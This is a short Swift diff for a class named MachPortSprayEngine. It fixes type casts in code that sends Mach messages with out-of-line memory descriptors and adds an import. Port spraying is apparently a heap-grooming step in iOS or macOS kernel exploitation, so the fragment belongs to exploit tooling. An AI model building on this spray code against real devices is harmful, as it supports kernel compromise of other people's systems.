@@ -8,6 +8,7 @@
 //
 
 import Foundation
+import Combine
 
 // MARK: - Port Info
 
@@ -245,16 +246,16 @@ class MachPortSprayEngine: ObservableObject {
             ool: mach_msg_ool_descriptor_t()
         )
         
-        msg.header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_MAKE_SEND, 0) | UInt32(MACH_MSGH_BITS_COMPLEX)
+        msg.header.msgh_bits = UInt32(MACH_MSG_TYPE_MAKE_SEND) | UInt32(MACH_MSGH_BITS_COMPLEX)
         msg.header.msgh_size = mach_msg_size_t(MemoryLayout<OOLMsg>.size)
         msg.header.msgh_remote_port = port
-        msg.header.msgh_local_port = MACH_PORT_NULL
+        msg.header.msgh_local_port = mach_port_t(MACH_PORT_NULL)
         
         oolData.withUnsafeBytes { buffer in
             msg.ool.address = UnsafeMutableRawPointer(mutating: buffer.baseAddress!)
             msg.ool.size = mach_msg_size_t(size)
             msg.ool.deallocate = 0
-            msg.ool.copy = UInt8(MACH_MSG_VIRTUAL_COPY)
+            msg.ool.copy = mach_msg_copy_options_t(MACH_MSG_VIRTUAL_COPY)
             msg.ool.type = UInt8(MACH_MSG_OOL_DESCRIPTOR)
         }
         
@@ -264,9 +265,9 @@ class MachPortSprayEngine: ObservableObject {
                 MACH_SEND_MSG | Int32(MACH_SEND_TIMEOUT),
                 msg.header.msgh_size,
                 0,
-                MACH_PORT_NULL,
+                mach_port_t(MACH_PORT_NULL),
                 100, // timeout ms
-                MACH_PORT_NULL
+                mach_port_t(MACH_PORT_NULL)
             )
         }
     }
